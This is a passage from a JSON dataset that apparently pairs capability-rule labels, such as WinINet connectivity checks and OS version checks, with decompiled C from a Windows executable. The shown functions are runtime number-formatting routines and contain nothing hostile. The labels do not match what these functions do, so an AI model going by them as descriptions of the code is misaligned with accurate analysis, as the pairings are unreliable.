            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140003580(uint64_t arg1, int64_t *arg2)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    ulong var_8h;\n    ulong auStack112 [5];\n    char acStack72 [8];\n    \n    iVar2 = *(arg2 + 2);\n    uVar9 = *(arg2 + 1);\n    iVar5 = *(arg2 + 0xc);\n    auStack112[0] = 0x1400035d7;\n    iVar3 = fcn.140002b40(arg1);\n    iVar3 = -iVar3;\n    pcVar1 = &stack0xffffffffffffffb8 + iVar3;\n    if ((uVar9 & 0x80) == 0) {\ncode_r0x0001400035f6:\n        pcVar6 = pcVar1;\n        if (arg1 != 0) goto code_r0x000140003602;\n    }\n    else {\n        if (-1 < arg1) {\n            uVar9 = uVar9 & 0xffffff7f;\n            *(arg2 + 1) = uVar9;\n            goto code_r0x0001400035f6;\n        }\n        arg1 = -arg1;\ncode_r0x000140003602:\n        pcVar6 = pcVar1;\n        while( true ) {\n            pcVar7 = pcVar6;\n            pcVar6 = pcVar7 + 1;\n            uVar4 = arg1 / 10;\n            *pcVar7 = arg1 + uVar4 * -10 + '0';\n            if (arg1 < 10) break;\n            arg1 = uVar4;\n            if ((((pcVar1 != pcVar6) && ((uVar9 & 0x1000) != 0)) && (*(arg2 + 4) != 0)) &&\n               ((pcVar6 - pcVar1 & 0x8000000000000003U) == 3)) {\n                *pcVar6 = ',';\n                pcVar6 = pcVar7 + 2;\n            }\n        }\n    }\n    pcVar7 = pcVar6;\n    if (iVar2 < 1) {\ncode_r0x0001400036c0:\n        pcVar6 = pcVar7;\n        if ((pcVar1 != pcVar7) || (iVar2 == 0)) goto code_r0x0001400036d1;\n    }\n    else {\n        iVar8 = iVar2 - (pcVar6 - pcVar1);\n        if (0 < iVar8) {\n            pcVar7 = pcVar6 + iVar8;\n            *(&stack0xffffffffffffff90 + iVar3) = 0x1400036c0;\n            sub.msvcrt.dll_memset(pcVar6, 0x30, iVar8);\n            goto code_r0x0001400036c0;\n        }\n        pcVar7 = pcVar1;\n        if (pcVar1 != pcVar6) goto code_r0x0001400036d1;\n    }\n    *pcVar7 = '0';\n    pcVar6 = pcVar7 + 1;\ncode_r0x0001400036d1:\n    if (0 < iVar5) {\n        iVar5 = iVar5 - (pcVar6 - pcVar1);\n        *(arg2 + 0xc) = iVar5;\n        if (0 < iVar5) {\n            if ((uVar9 & 0x1c0) != 0) {\n                *(arg2 + 0xc) = iVar5 + -1;\n            }\n            if ((iVar2 < 0) && ((uVar9 & 0x600) == 0x200)) {\n                iVar2 = *(arg2 + 0xc);\n                *(arg2 + 0xc) = iVar2 + -1;\n                if (0 < iVar2) {\n                    *(&stack0xffffffffffffff90 + iVar3) = 0x1400038b9;\n                    sub.msvcrt.dll_memset(pcVar6, 0x30, iVar2);\n                    *(arg2 + 0xc) = 0xffffffff;\n                    pcVar6 = pcVar6 + iVar2;\n                }\n            }\n            else if (((uVar9 & 0x400) == 0) && (iVar2 = *(arg2 + 0xc),  *(arg2 + 0xc) = iVar2 + -1,  0 < iVar2)) {\n                do {\n                    *(&stack0xffffffffffffff90 + iVar3) = 0x1400038ed;\n                    fcn.140002ca0(0x20, arg2);\n                    iVar2 = *(arg2 + 0xc);\n                    *(arg2 + 0xc) = iVar2 + -1;\n                } while (0 < iVar2);\n                uVar9 = *(arg2 + 1);\n            }\n        }\n    }\n    if ((uVar9 & 0x80) == 0) {\n        if ((uVar9 & 0x100) == 0) {\n            if ((uVar9 & 0x40) != 0) {\n                *pcVar6 = ' ';\n                pcVar6 = pcVar6 + 1;\n            }\n        }\n        else {\n            *pcVar6 = '+';\n            pcVar6 = pcVar6 + 1;\n        }\n    }\n    else {\n        *pcVar6 = '-';\n        pcVar6 = pcVar6 + 1;\n    }\n    if (pcVar1 < pcVar6) {\n        do {\n            pcVar6 = pcVar6 + -1;\n            if (((uVar9 & 0x4000) == 0) && (iVar2 = *(arg2 + 0x24),  *(arg2 + 5) == iVar2 || *(arg2 + 5) < iVar2)) {\ncode_r0x00014000373a:\n                *(arg2 + 0x24) = iVar2 + 1;\n            }\n            else {\n                if ((uVar9 & 0x2000) == 0) {\n                    *(*arg2 + *(arg2 + 0x24)) = *pcVar6;\n                    iVar2 = *(arg2 + 0x24);\n                    goto code_r0x00014000373a;\n                }\n                *(&stack0xffffffffffffff90 + iVar3) = 0x140003772;\n                sub.msvcrt.dll_fputc();\n                *(arg2 + 0x24) = *(arg2 + 0x24) + 1;\n            }\n            if (pcVar1 == pcVar6) break;\n            uVar9 = *(arg2 + 1);\n        } while( true );\n    }\n    iVar2 = *(arg2 + 0xc);\n    while( true ) {\n        *(arg2 + 0xc) = iVar2 + -1;\n        if (iVar2 < 1) break;\n        if (((*(arg2 + 1) & 0x4000) != 0) ||\n           (iVar5 = *(arg2 + 0x24),  iVar2 = iVar2 + -1,  *(arg2 + 5) != iVar5 && iVar5 <= *(arg2 + 5))) {\n            if ((*(arg2 + 1) & 0x2000) == 0) {\n                *(*arg2 + *(arg2 + 0x24)) = 0x20;\n                iVar5 = *(arg2 + 0x24);\n                iVar2 = *(arg2 + 0xc);\n            }\n            else {\n                *(&stack0xffffffffffffff90 + iVar3) = 0x1400037ca;\n                sub.msvcrt.dll_fputc();\n                iVar5 = *(arg2 + 0x24);\n                iVar2 = *(arg2 + 0xc);\n            }\n        }\n        *(arg2 + 0x24) = iVar5 + 1;\n    }\n    return;\n}\n",
        "token_count": 1773
    },
    "140003a6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140003a60(ulong arg1, char *arg2, ulong arg3, int64_t arg4)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    \n    iVar4 = *(arg4 + 0xc);\n    if (arg3 < 1) {\n        if (iVar4 < 1) {\n            if ((iVar4 == 0) && (*(arg4 + 0x10) < 0)) {\n                iVar4 = -*(arg4 + 0x10);\n                *(arg4 + 0xc) = iVar4;\ncode_r0x000140003ce8:\n                if ((*(arg4 + 8) & 0x800) != 0) goto code_r0x000140003aa1;\n                if ((0 < arg3) && ((*(arg4 + 8) & 0x1000) != 0)) goto code_r0x000140003d05;\n                goto code_r0x000140003ab9;\n            }\n        }\n        else {\n            iVar3 = *(arg4 + 0x10);\n            iVar4 = iVar4 + -1;\n            if (iVar3 < iVar4) goto code_r0x000140003a94;\n        }\n        *(arg4 + 0xc) = 0xffffffff;\n        if (arg1 == 0) goto code_r0x000140003b03;\ncode_r0x000140003be0:\n        fcn.140002ca0(0x2d, arg4);\n    }\n    else {\n        if (iVar4 < arg3) {\n            *(arg4 + 0xc) = 0xffffffff;\n            if (((*(arg4 + 9) & 0x10) != 0) && (*(arg4 + 0x20) != 0)) {\n                iVar4 = -1;\n                uVar2 = (arg3 + 2U) / 3;\n                if ((arg3 + 2U) / 3 != 1) {\ncode_r0x000140003d8b:\n                    iVar3 = (uVar2 - 1) - iVar4;\n                    do {\n                        if (iVar4 < 1) goto code_r0x000140003afb;\n                        iVar4 = iVar4 + -1;\n                        *(arg4 + 0xc) = iVar4;\n                    } while (iVar3 + iVar4 != 0);\n                    goto code_r0x000140003ab5;\n                }\n            }\ncode_r0x000140003afb:\n            if (arg1 != 0) goto code_r0x000140003be0;\ncode_r0x000140003b03:\n            uVar2 = *(arg4 + 8);\n        }\n        else {\n            iVar3 = *(arg4 + 0x10);\n            iVar4 = iVar4 - arg3;\n            if (iVar3 < iVar4) {\ncode_r0x000140003a94:\n                iVar4 = iVar4 - iVar3;\n                *(arg4 + 0xc) = iVar4;\n                if (iVar3 < 1) goto code_r0x000140003ce8;\ncode_r0x000140003aa1:\n                iVar4 = iVar4 + -1;\n                *(arg4 + 0xc) = iVar4;\n                if ((0 < arg3) && ((*(arg4 + 9) & 0x10) != 0)) {\ncode_r0x000140003d05:\n                    if (*(arg4 + 0x20) != 0) goto code_r0x000140003df2;\n                }\n            }\n            else {\n                *(arg4 + 0xc) = 0xffffffff;\n                if (((*(arg4 + 9) & 0x10) == 0) || (*(arg4 + 0x20) == 0)) goto code_r0x000140003afb;\n                iVar4 = -1;\ncode_r0x000140003df2:\n                uVar2 = (arg3 + 2) / 3;\n                if (uVar2 != 1) goto code_r0x000140003d8b;\n            }\ncode_r0x000140003ab5:\n            if (iVar4 < 1) goto code_r0x000140003afb;\ncode_r0x000140003ab9:\n            if (arg1 != 0) {\n                *(arg4 + 0xc) = iVar4 + -1;\n                if ((iVar4 + -1 == 0) || ((*(arg4 + 8) & 0x600) != 0)) goto code_r0x000140003be0;\ncode_r0x000140003ca3:\n                iVar4 = iVar4 + -2;\ncode_r0x000140003ca6:\n                *(arg4 + 0xc) = iVar4;\n                do {\n                    fcn.140002ca0(0x20, arg4);\n                    iVar4 = *(arg4 + 0xc);\n                    *(arg4 + 0xc) = iVar4 + -1;\n                } while (0 < iVar4);\n                goto code_r0x000140003afb;\n            }\n            uVar2 = *(arg4 + 8);\n            if ((uVar2 & 0x1c0) == 0) {\n                iVar4 = iVar4 + -1;\n                if ((uVar2 & 0x600) == 0) goto code_r0x000140003ca6;\n            }\n            else {\n                *(arg4 + 0xc) = iVar4 + -1;\n                if ((iVar4 + -1 != 0) && ((uVar2 & 0x600) == 0)) goto code_r0x000140003ca3;\n            }\n        }\n        if ((uVar2 & 0x100) == 0) {\n            if ((uVar2 & 0x40) != 0) {\n                fcn.140002ca0(0x20, arg4);\n            }\n        }\n        else {\n            fcn.140002ca0(0x2b, arg4);\n        }\n    }\n    if ((0 < *(arg4 + 0xc)) && ((*(arg4 + 8) & 0x600) == 0x200)) {\n        *(arg4 + 0xc) = *(arg4 + 0xc) + -1;\n        do {\n            fcn.140002ca0(0x30, arg4);\n            iVar4 = *(arg4 + 0xc);\n            *(arg4 + 0xc) = iVar4 + -1;\n        } while (0 < iVar4);\n    }\n    if (arg3 < 1) {\n        fcn.140002ca0(0x30, arg4);\n        iVar4 = *(arg4 + 0x10);\n        if ((0 < iVar4) || ((*(arg4 + 9) & 8) != 0)) goto code_r0x000140003c58;\n        if (arg3 == 0) goto code_r0x000140003ba1;\n    }\n    else {\n        while( true ) {\n            cVar1 = *arg2;\n            uVar5 = 0x30;\n            if (cVar1 != '\\0') {\n                arg2 = arg2 + 1;\n                uVar5 = cVar1;\n            }\n            fcn.140002ca0(uVar5, arg4);\n            arg3._0_4_ = arg3 + -1;\n            if (arg3 == 0) break;\n            if ((((*(arg4 + 9) & 0x10) != 0) && (*(arg4 + 0x20) != 0)) && (arg3 * -0x55555555 < 0x55555556)) {\n                fcn.140002d00(arg4 + 0x20, 1, arg4);\n            }\n        }\n        iVar4 = *(arg4 + 0x10);\n        if (0 < iVar4) {\n            fcn.140003910(arg4);\n            goto code_r0x000140003c23;\n        }\n        if ((*(arg4 + 9) & 8) == 0) {\ncode_r0x000140003ba1:\n            *(arg4 + 0x10) = iVar4 + -1;\n            return;\n        }\ncode_r0x000140003c58:\n        fcn.140003910(arg4);\n        if (arg3 == 0) goto code_r0x000140003c23;\n        iVar4 = *(arg4 + 0x10);\n    }\n    *(arg4 + 0x10) = iVar4 + arg3;\n    do {\n        fcn.140002ca0(0x30, arg4);\n        arg3._0_4_ = arg3 + 1;\n    } while (arg3 != 0);\ncode_r0x000140003c23:\n    while (iVar4 = *(arg4 + 0x10),  *(arg4 + 0x10) = iVar4 + -1,  0 < iVar4) {\n        cVar1 = *arg2;\n        uVar5 = 0x30;\n        if (cVar1 != '\\0') {\n            arg2 = arg2 + 1;\n            uVar5 = cVar1;\n        }\n        fcn.140002ca0(uVar5, arg4);\n    }\n    return;\n}\n",
        "token_count": 2079
    },
    "14000421": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140004210(uint64_t arg1, ulong arg2, int64_t *arg3)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    char *pcVar11;\n    uint8_t *puVar12;\n    char *pcVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    ulong auStack112 [2];\n    int16_t iStack90;\n    uint8_t uStack88;\n    uint8_t auStack87 [15];\n    char acStack72 [24];\n    \n    uVar6 = *(arg3 + 2);\n    if ((arg2 == 0) && (arg1 == 0)) {\n        if (uVar6 < 0xf) {\n            arg2._0_2_ = 0;\ncode_r0x0001400042e5:\n            uVar3 = ('\\x0f' - uVar6) * '\\x04';\n            uVar10 = (4 << (('\\x0e' - uVar6) * '\\x04' & 0x3fU)) + (arg1 >> 1);\n            if (uVar10 < 0) {\n                arg2._0_2_ = arg2 + 4;\n                arg1 = (uVar10 >> 3) >> (uVar3 & 0x3f);\n            }\n            else {\n                arg1 = uVar10 * 2 >> (uVar3 & 0x3f);\n                if ((arg1 == 0) && (uVar6 == 0)) {\n                    uVar6 = *(arg3 + 1);\n                    uVar10 = arg2;\n                    goto code_r0x000140004336;\n                }\n            }\n            iVar7 = uVar6 + 1;\n            uVar10 = arg2;\n        }\n        else {\n            if (uVar6 < 1) {\n                uVar6 = *(arg3 + 1);\n                uVar10 = 0;\n                arg2._0_2_ = 0;\n                goto code_r0x000140004336;\n            }\n            uVar10 = 0;\n            arg2._0_2_ = 0;\n            iVar7 = 0x10;\n            arg1 = 0;\n        }\ncode_r0x000140004254:\n        uVar6 = *(arg3 + 1);\n        puVar12 = &uStack88;\n        do {\n            uVar4 = arg1 & 0xf;\n            cVar2 = uVar4;\n            if (iVar7 == 1) {\n                if (((&uStack88 < puVar12) || ((uVar6 & 0x800) != 0)) || (0 < *(arg3 + 2))) {\n                    *puVar12 = 0x2e;\n                    puVar12 = puVar12 + 1;\n                    goto code_r0x0001400042c2;\n                }\n                if ((arg1 & 0xf) == 0) {\n                    if (*(arg3 + 2) == 0) {\n                        *puVar12 = 0x30;\n                        puVar12 = puVar12 + 1;\n                    }\n                    break;\n                }\ncode_r0x0001400042c6:\n                if (uVar4 < 10) {\ncode_r0x000140004288:\n                    uVar3 = cVar2 + 0x30;\n                }\n                else {\n                    uVar3 = cVar2 + 0x37U | uVar6 & 0x20;\n                }\n                *puVar12 = uVar3;\n                puVar12 = puVar12 + 1;\n            }\n            else {\n                if (0 < *(arg3 + 2)) {\n                    *(arg3 + 2) = *(arg3 + 2) + -1;\n                }\ncode_r0x0001400042c2:\n                if ((arg1 & 0xf) != 0) goto code_r0x0001400042c6;\n                if ((&uStack88 < puVar12) || (-1 < *(arg3 + 2))) goto code_r0x000140004288;\n            }\n            arg1 = arg1 >> 4;\n            iVar7 = iVar7 + -1;\n        } while (iVar7 != 0);\n        if (puVar12 == &uStack88) {\n            if (*(arg3 + 2) < 1) goto code_r0x000140004336;\n            goto code_r0x00014000433e;\n        }\n        iVar7 = *(arg3 + 0xc);\n        iVar16 = 2;\n        if (0 < iVar7) goto code_r0x00014000449c;\ncode_r0x000140004362:\n        if ((uVar6 & 0x80) != 0) goto code_r0x000140004560;\ncode_r0x00014000436b:\n        if ((uVar6 & 0x100) == 0) {\n            if ((uVar6 & 0x40) != 0) {\n                fcn.140002ca0(0x20, arg3);\n            }\n        }\n        else {\n            fcn.140002ca0(0x2b, arg3);\n        }\n    }\n    else {\n        arg2._0_2_ = arg2 + -3;\n        if (uVar6 < 0xf) goto code_r0x0001400042e5;\n        uVar10 = arg2;\n        iVar7 = 0x10;\n        if ((arg1 != 0) || (0 < uVar6)) goto code_r0x000140004254;\n        uVar6 = *(arg3 + 1);\ncode_r0x000140004336:\n        puVar12 = &uStack88;\n        if ((uVar6 & 0x800) != 0) {\ncode_r0x00014000433e:\n            uStack88 = 0x2e;\n            puVar12 = auStack87;\n        }\n        iVar7 = *(arg3 + 0xc);\n        *puVar12 = 0x30;\n        puVar12 = puVar12 + 1;\n        iVar16 = 2;\n        if (iVar7 < 1) goto code_r0x000140004362;\ncode_r0x00014000449c:\n        iVar16 = 2;\n        iVar8 = puVar12 - (*0x20 + -0x58);\n        if (0 < *(arg3 + 2)) {\n            iVar8 = *(arg3 + 2) + iVar8;\n        }\n        iVar14 = (iVar8 + 6) - ((uVar6 & 0x1c0) == 0);\n        iVar8 = arg2 / 10 - (arg2 >> 0x1f);\n        iVar15 = iVar14;\n        if (iVar8 != 0) {\n            do {\n                iVar15 = iVar15 + 1;\n                iVar8 = iVar8 / 10;\n            } while (iVar8 != 0);\n            iVar16 = (iVar15 - iVar14) + 2;\n        }\n        if (iVar7 <= iVar15) {\n            iVar7 = -1;\ncode_r0x000140004606:\n            *(arg3 + 0xc) = iVar7;\n            goto code_r0x000140004362;\n        }\n        iVar7 = iVar7 - iVar15;\n        if ((uVar6 & 0x600) != 0) goto code_r0x000140004606;\n        *(arg3 + 0xc) = iVar7 + -1;\n        do {\n            fcn.140002ca0(0x20, arg3);\n            iVar7 = *(arg3 + 0xc);\n            *(arg3 + 0xc) = iVar7 + -1;\n        } while (0 < iVar7);\n        uVar6 = *(arg3 + 1);\n        if ((uVar6 & 0x80) == 0) goto code_r0x00014000436b;\ncode_r0x000140004560:\n        fcn.140002ca0(0x2d, arg3);\n    }\n    fcn.140002ca0(0x30, arg3);\n    fcn.140002ca0(*(arg3 + 1) & 0x20 | 0x58, arg3);\n    if ((0 < *(arg3 + 0xc)) && ((*(arg3 + 9) & 2) != 0)) {\n        *(arg3 + 0xc) = *(arg3 + 0xc) + -1;\n        do {\n            fcn.140002ca0(0x30, arg3);\n            iVar7 = *(arg3 + 0xc);\n            *(arg3 + 0xc) = iVar7 + -1;\n        } while (0 < iVar7);\n    }\n    if (&uStack88 < puVar12) {\n        do {\n            uVar6 = puVar12[-1];\n            puVar12 = puVar12 + -1;\n            if (uVar6 == 0x2e) {\n                fcn.140003910(arg3);\n            }\n            else if (uVar6 == 0x2c) {\n                iStack90 = *(arg3 + 4);\n                if (*(arg3 + 4) != 0) {\n                    fcn.140002d00(&iStack90, 1, arg3);\n                }\n            }\n            else {\n                fcn.140002ca0(uVar6, arg3);\n            }\n        } while (puVar12 != &uStack88);\n    }\n    while (iVar7 = *(arg3 + 2),  *(arg3 + 2) = iVar7 + -1,  0 < iVar7) {\n        fcn.140002ca0(0x30, arg3);\n    }\n    fcn.140002ca0(*(arg3 + 1) & 0x20 | 0x50, arg3);\n    *(arg3 + 0xc) = *(arg3 + 0xc) + iVar16;\n    *(arg3 + 1) = *(arg3 + 1) | 0x1c0;\n    iVar7 = *(arg3 + 2);\n    uVar6 = *(arg3 + 1);\n    iVar16 = *(arg3 + 0xc);\n    auStack112[0] = 0x1400035d7;\n    iVar5 = fcn.140002b40(uVar10);\n    iVar5 = -iVar5;\n    pcVar1 = acStack72 + iVar5;\n    if ((uVar6 & 0x80) == 0) {\ncode_r0x0001400035f6:\n        pcVar11 = pcVar1;\n        if (uVar10 != 0) goto code_r0x000140003602;\n    }\n    else {\n        if (-1 < uVar10) {\n            uVar6 = uVar6 & 0xffffff7f;\n            *(arg3 + 1) = uVar6;\n            goto code_r0x0001400035f6;\n        }\n        uVar10 = -uVar10;\ncode_r0x000140003602:\n        pcVar11 = pcVar1;\n        while( true ) {\n            pcVar13 = pcVar11;\n            pcVar11 = pcVar13 + 1;\n            uVar9 = uVar10 / 10;\n            *pcVar13 = uVar10 + uVar9 * -10 + '0';\n            if (uVar10 < 10) break;\n            uVar10 = uVar9;\n            if ((((pcVar1 != pcVar11) && ((uVar6 & 0x1000) != 0)) && (*(arg3 + 4) != 0)) &&\n               ((pcVar11 - pcVar1 & 0x8000000000000003U) == 3)) {\n                *pcVar11 = ',';\n                pcVar11 = pcVar13 + 2;\n            }\n        }\n    }\n    pcVar13 = pcVar11;\n    if (iVar7 < 1) {\ncode_r0x0001400036c0:\n        pcVar11 = pcVar13;\n        if ((pcVar1 != pcVar13) || (iVar7 == 0)) goto code_r0x0001400036d1;\n    }\n    else {\n        iVar8 = iVar7 - (pcVar11 - pcVar1);\n        if (0 < iVar8) {\n            pcVar13 = pcVar11 + iVar8;\n            *(auStack112 + iVar5) = 0x1400036c0;\n            sub.msvcrt.dll_memset(pcVar11, 0x30, iVar8);\n            goto code_r0x0001400036c0;\n        }\n        pcVar13 = pcVar1;\n        if (pcVar1 != pcVar11) goto code_r0x0001400036d1;\n    }\n    *pcVar13 = '0';\n    pcVar11 = pcVar13 + 1;\ncode_r0x0001400036d1:\n    if (0 < iVar16) {\n        iVar16 = iVar16 - (pcVar11 - pcVar1);\n        *(arg3 + 0xc) = iVar16;\n        if (0 < iVar16) {\n            if ((uVar6 & 0x1c0) != 0) {\n                *(arg3 + 0xc) = iVar16 + -1;\n            }\n            if ((iVar7 < 0) && ((uVar6 & 0x600) == 0x200)) {\n                iVar7 = *(arg3 + 0xc);\n                *(arg3 + 0xc) = iVar7 + -1;\n                if (0 < iVar7) {\n                    *(auStack112 + iVar5) = 0x1400038b9;\n                    sub.msvcrt.dll_memset(pcVar11, 0x30, iVar7);\n                    *(arg3 + 0xc) = 0xffffffff;\n                    pcVar11 = pcVar11 + iVar7;\n                }\n            }\n            else if (((uVar6 & 0x400) == 0) && (iVar7 = *(arg3 + 0xc),  *(arg3 + 0xc) = iVar7 + -1,  0 < iVar7)) {\n                do {\n                    *(auStack112 + iVar5) = 0x1400038ed;\n                    fcn.140002ca0(0x20, arg3);\n                    iVar7 = *(arg3 + 0xc);\n                    *(arg3 + 0xc) = iVar7 + -1;\n                } while (0 < iVar7);\n                uVar6 = *(arg3 + 1);\n            }\n        }\n    }\n    if ((uVar6 & 0x80) == 0) {\n        if ((uVar6 & 0x100) == 0) {\n            if ((uVar6 & 0x40) != 0) {\n                *pcVar11 = ' ';\n                pcVar11 = pcVar11 + 1;\n            }\n        }\n        else {\n            *pcVar11 = '+';\n            pcVar11 = pcVar11 + 1;\n        }\n    }\n    else {\n        *pcVar11 = '-';\n        pcVar11 = pcVar11 + 1;\n    }\n    if (pcVar1 < pcVar11) {\n        do {\n            pcVar11 = pcVar11 + -1;\n            if (((uVar6 & 0x4000) == 0) && (iVar7 = *(arg3 + 0x24),  *(arg3 + 5) == iVar7 || *(arg3 + 5) < iVar7)) {\ncode_r0x00014000373a:\n                *(arg3 + 0x24) = iVar7 + 1;\n            }\n            else {\n                if ((uVar6 & 0x2000) == 0) {\n                    *(*arg3 + *(arg3 + 0x24)) = *pcVar11;\n                    iVar7 = *(arg3 + 0x24);\n                    goto code_r0x00014000373a;\n                }\n                *(auStack112 + iVar5) = 0x140003772;\n                sub.msvcrt.dll_fputc();\n                *(arg3 + 0x24) = *(arg3 + 0x24) + 1;\n            }\n            if (pcVar1 == pcVar11) break;\n            uVar6 = *(arg3 + 1);\n        } while( true );\n    }\n    iVar7 = *(arg3 + 0xc);\n    while( true ) {\n        *(arg3 + 0xc) = iVar7 + -1;\n        if (iVar7 < 1) break;\n        if (((*(arg3 + 1) & 0x4000) != 0) ||\n           (iVar16 = *(arg3 + 0x24),  iVar7 = iVar7 + -1,  *(arg3 + 5) != iVar16 && iVar16 <= *(arg3 + 5))) {\n            if ((*(arg3 + 1) & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = 0x20;\n                iVar16 = *(arg3 + 0x24);\n                iVar7 = *(arg3 + 0xc);\n            }\n            else {\n                *(auStack112 + iVar5) = 0x1400037ca;\n                sub.msvcrt.dll_fputc();\n                iVar16 = *(arg3 + 0x24);\n                iVar7 = *(arg3 + 0xc);\n            }\n        }\n        *(arg3 + 0x24) = iVar16 + 1;\n    }\n    return;\n}\n",
        "token_count": 3947
    },
    "1400053f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x000140005715: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00014000571a)\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t * fcn.1400053f0(int32_t *arg1, ulong arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    uint64_t arg1_00;\n    int64_t iVar11;\n    char *pcVar12;\n    uint64_t uVar13;\n    uint32_t *puVar14;\n    uint32_t uVar15;\n    uint32_t *puVar16;\n    uint32_t *puVar17;\n    uint64_t unaff_RBX;\n    uint32_t *unaff_RSI;\n    uint64_t unaff_RDI;\n    uint8_t uVar18;\n    int32_t iVar19;\n    int64_t iVar20;\n    uint32_t uVar21;\n    uint64_t extraout_XMM0_Qa;\n    double dVar22;\n    double dVar23;\n    double dVar24;\n    double dVar25;\n    double dVar26;\n    uint32_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    uint32_t **in_stack_00000040;\n    ulong uStack256;\n    uint32_t *puStack216;\n    uint32_t **ppuStack208;\n    uint64_t uStack200;\n    ulong uStack192;\n    uint32_t *puStack184;\n    ulong uStack176;\n    ulong uStack168;\n    uint32_t uStack160;\n    uint32_t uStack156;\n    ulong uStack152;\n    uint32_t *puStack144;\n    ulong uStack136;\n    uint32_t uStack128;\n    int32_t iStack124;\n    uint32_t uStack120;\n    int32_t iStack116;\n    double dStack112;\n    double dStack104;\n    uint32_t uStack96;\n    uint32_t uStack92;\n    uint32_t uStack76;\n    \n    uVar21 = *arg4;\n    uStack192 = uStack192 & 0xffffffff00000000 | in_stack_00000030;\n    uStack200 = uStack200 & 0xffffffff00000000 | arg2;\n    puStack216 = in_stack_00000038;\n    puStack184 = arg4;\n    ppuStack208 = in_stack_00000040;\n    *arg4 = uVar21 & 0xffffffcf;\n    uVar6 = uVar21 & 7;\n    if (uVar6 == 3) {\n        uVar21 = 8;\n        pcVar12 = \"Infinity\";\n        *in_stack_00000038 = 0xffff8000;\n        goto code_r0x0001400051c0;\n    }\n    uVar9 = uVar21 & 4;\n    uStack176 = uStack176 & 0xffffffff00000000 | uVar21 & 0xffffffff00000004;\n    if ((uVar21 & 4) != 0) {\n        if (uVar6 != 4) {\n            return NULL;\n        }\n        uVar21 = 3;\n        pcVar12 = 0x14006e509;\n        *in_stack_00000038 = 0xffff8000;\n        goto code_r0x0001400051c0;\n    }\n    if (uVar6 != 0) {\n        iVar8 = *arg1;\n        uVar9 = 0;\n        iVar7 = 0x20;\n        if (0x20 < iVar8) {\n            do {\n                iVar19 = iVar7 * 2;\n                uVar9 = uVar9 + 1;\n                iVar4 = iVar7 * -2;\n                iVar7 = iVar19;\n            } while (iVar8 != iVar19 && SBORROW4(iVar8, iVar19) == iVar8 + iVar4 < 0);\n        }\n        uStack256 = 0x14000548d;\n        uVar9 = fcn.140006e40(uVar9);\n        iVar20 = iVar8 + -1 >> 5;\n        puVar16 = arg3;\n        puVar14 = uVar9 + 0x18;\n        do {\n            uVar6 = *puVar16;\n            puVar16 = puVar16 + 1;\n            *puVar14 = uVar6;\n            puVar14 = puVar14 + 1;\n        } while (puVar16 <= arg3 + iVar20);\n        iVar10 = iVar20 * 4 + 4;\n        if (arg3 + iVar20 + 1U < arg3 + 1U) {\n            iVar10 = 4;\n        }\n        uVar13 = iVar10 >> 2 & 0xffffffff;\n        iVar20 = uVar9 + (iVar10 >> 2) * 4;\ncode_r0x0001400054fd:\n        iVar7 = uVar13;\n        uVar6 = iVar7 - 1;\n        uVar13 = uVar6;\n        if (*(iVar20 + 0x14) == 0) goto code_r0x0001400054f0;\n        *(uVar9 + 0x14) = iVar7;\n        puVar16 = uVar9 + 0x18 + uVar6 * 4;\n        uVar6 = 0x1f;\n        if (*puVar16 != 0) {\n            for (; *puVar16 >> uVar6 == 0; uVar6 = uVar6 - 1) {\n            }\n        }\n        uVar6 = iVar7 * 0x20 - (uVar6 ^ 0x1f);\n        goto code_r0x000140005524;\n    }\n    goto code_r0x0001400056f8;\ncode_r0x0001400054f0:\n    iVar20 = iVar20 + -4;\n    if (uVar6 == 0) goto code_r0x000140005760;\n    goto code_r0x0001400054fd;\ncode_r0x0001400060f3:\n    uStack256 = 0x140006103;\n    uVar9 = fcn.140006fa0(uVar9, 10, 0);\n    if (iVar10 == iVar20) {\n        uStack256 = 0x14000623d;\n        iVar10 = fcn.140006fa0(iVar10, 10, 0);\n        iVar20 = iVar10;\n    }\n    else {\n        uStack256 = 0x14000611f;\n        iVar10 = 